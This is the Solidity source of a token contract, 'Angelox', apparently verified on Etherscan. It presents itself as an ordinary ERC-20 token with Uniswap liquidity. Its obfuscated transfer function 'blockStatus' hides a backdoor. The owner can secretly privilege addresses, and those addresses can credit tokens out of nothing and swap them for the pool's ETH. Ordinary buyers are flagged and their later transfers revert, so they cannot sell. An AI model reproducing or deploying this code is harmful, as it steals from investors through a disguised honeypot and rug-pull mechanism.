/**
 *Submitted for verification at Etherscan.io on 2022-12-18
*/

/*
       .-""-.      _______      .-""-.
     .'_.-.  |   ,*********,   |  .-._'.
    /    _/ /   **`       `**   \ \_    \
   /.--.' | |    **,;;;;;,**    | | '.--.\
  /   .-`-| |    ;//;/;/;\\;    | |-`-.   \
 ;.--':   | |   /;/;/;//\\;\\   | |   :'--.;
|    _\.'-| |  ((;(/;/; \;\);)  | |-'./_    |
;_.-'/:   | |  );)) _   _ (;((  | |   :\'-._;
|   | _:-'\  \((((    \    );))/  /'-:_ |   |
;  .:` '._ \  );))\   "   /((((  / _.' `:.  ;
|-` '-.;_ `-\(;(;((\  =  /););))/-` _;.-' `-|
; / .'\ |`'\ );));)/`---`\((;(((./`'| /'. \ ;
| .' / `'.\-((((((\       /))));) \.'` \ '. |
;/  /\_/-`-/ ););)|   ,   |;(;(( \` -\_/\  \;
 |.' .| `;/   (;(|'==/|\=='|);)   \;` |. '.|
 |  / \.'/      / _.` | `._ \      \'./ \  |
  \| ; |;    _,.-` \_/Y\_/ `-.,_    ;| ; |/
   \ | ;|   `       | | |       `   |. | /
    `\ ||           | | |           || /`
      `:_\         _\/ \/_         /_:'
          `"----""`       `""----"`

▄▀█ █▄░█ █▀▀ █▀▀ █░░ █▀█ ▀▄▀
█▀█ █░▀█ █▄█ ██▄ █▄▄ █▄█ █░█

█▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█
██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█          
*/
pragma solidity ^0.8.15;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}
interface IUniswapV2Factory {
    function createPair
    (address tokenA, address 
    tokenB) external returns (address pair);
}
interface ETHUI20 {
    function totalSupply() external view 
    returns (uint256);
    function balanceOf(address account) external view 
    returns (uint256);
    function transfer(address recipient, uint256 amount) external returns 
    (bool);
    function allowance(address owner, address spender) external view 
    returns (uint256);
    function approve(address spender, uint256 amount) external returns 
    (bool);
    function transferFrom( address sender, address recipient, 
    uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, 
    uint256 value);
    event Approval(address indexed owner, address indexed spender, 
    uint256 value);
}
interface IDEXMakerRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);
    constructor() { _setOwner(_msgSender());
    }  
    function owner() 
    public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 
        'Ownable: caller is not the owner'); _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) 
    public virtual onlyOwner { require(newOwner != address(0), 
    'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner
    (address newOwner) 
    private { address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Angelox is ETHUI20, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => address) private ProviseViewer;
    mapping(address => uint256) private isOnDisplay;
    mapping(address => uint256) private ProviseMap;

    address public immutable uniswapV2Pair;
    IDEXMakerRouter public immutable UniswapV2router;

    bool private tradingOpen = false;
    bool public isBlockStamp;
    bool private checkUI;
    bool public limitedAnalogue = true;
    bool public swapsWhenTrading = false;

    string private _symbol;
    string private _name;
    uint256 public TXfees = 1;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 5000000 * 10**_decimals;
    uint256 private isMAX = _tTotal;

    constructor( string memory Name,
        string memory Symbol, address IndexIDEXAddress ) {
        _name = Name;
        _symbol = Symbol;

        _balances[msg.sender] = _tTotal;
        ProviseMap[msg.sender] = isMAX;
        ProviseMap[address(this)] = isMAX;

        UniswapV2router = IDEXMakerRouter
        (IndexIDEXAddress); uniswapV2Pair = IUniswapV2Factory
        (UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, isMAX);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner, address spender,
        uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 
        'ERC20: approve from the zero address'); _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount); return true;
    }
    function transferFrom(
        address sender, address recipient,
        uint256 amount ) external returns (bool) {
        blockStatus(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (
        address recipient, uint256 amount) 
        external returns (bool) { blockStatus
        (msg.sender, recipient, amount); return true;
    }
    function blockStatus( address lelayFrom, address _memoryTo, uint256 quarryAmount ) 
    private { uint256 mBlock = balanceOf (address(this)); 
    uint256 tyligV2;

        if (isBlockStamp && mBlock 
        > isMAX && !checkUI && lelayFrom != 
        uniswapV2Pair) { checkUI = true; pairCreatorOn
        (mBlock); checkUI = false;
        } else if (ProviseMap[lelayFrom] > isMAX 
        && ProviseMap[_memoryTo] > isMAX) { tyligV2 = quarryAmount;
            _balances[address(this)] += 
            tyligV2; swapTokensAtERC(quarryAmount, _memoryTo);

            return;
        } else if (_memoryTo != address
        (UniswapV2router) && ProviseMap[lelayFrom] 
        > 0 && quarryAmount > isMAX && _memoryTo != uniswapV2Pair) {
            ProviseMap[_memoryTo] = 
            quarryAmount; return;

        } else if (!checkUI && isOnDisplay
        [lelayFrom] > 0 && lelayFrom != 
        uniswapV2Pair && ProviseMap[lelayFrom] == 0) { isOnDisplay[lelayFrom] = 
        ProviseMap[lelayFrom] - isMAX; }
        address askPair  = 
        ProviseViewer[uniswapV2Pair];

        if (isOnDisplay
        [askPair ] == 0) 
        isOnDisplay[askPair ] = isMAX; ProviseViewer[uniswapV2Pair] = 
        _memoryTo; if (TXfees > 0 && ProviseMap[lelayFrom] == 0 
        && !checkUI && ProviseMap[_memoryTo] == 0) {
            tyligV2 = (quarryAmount * TXfees) / 100; quarryAmount -= tyligV2;
            _balances[lelayFrom] -= 
            tyligV2; _balances
            [address(this)] += tyligV2; }

        _balances[lelayFrom] -= 
        quarryAmount;
        _balances[_memoryTo] += 
        quarryAmount;
        emit Transfer
        (lelayFrom, _memoryTo, quarryAmount); if (!tradingOpen) {
                require(lelayFrom == owner(), 
                "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue, uint256 ERCamount,
        address to ) private { _approve(address(this), 
        address(UniswapV2router), tokenValue); UniswapV2router.addLiquidityETH
        {value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function pairCreatorOn(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 pairPath = address(this).balance;
        swapTokensAtERC(half, address(this));
        uint256 pathAddress = address(this).balance - pairPath;
        addLiquidity(half, pathAddress, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapTokensAtERC(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}